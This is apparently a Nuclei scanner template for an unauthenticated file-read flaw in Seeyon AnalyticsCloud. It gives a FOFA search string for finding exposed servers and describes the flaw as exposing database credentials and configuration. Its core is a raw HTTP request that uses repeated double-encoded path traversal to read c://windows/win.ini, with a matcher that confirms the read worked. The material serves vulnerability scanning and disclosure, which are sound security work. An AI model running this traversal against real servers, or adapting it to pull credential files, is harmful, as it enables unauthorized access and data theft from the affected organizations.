id: seeyon-analyticscloud-file-read

info:
  name: 致远 AnalyticsCloud 分析云文件读取权限控制缺陷
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: title="AnalyticsCloud 分析云"
          该漏洞允许未经身份验证的攻击者通过特定路径访问受限文件资源，可读取包含数据库连接凭证、系统配置参数等敏感信息的文件内容。成功利用该缺陷可导致系统权限越权、数据泄露及后续攻击链的形成。
  tags: 致远

http:
- raw:
  - |
    GET /.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/c://windows/win.ini HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - "for 16-bit app support"
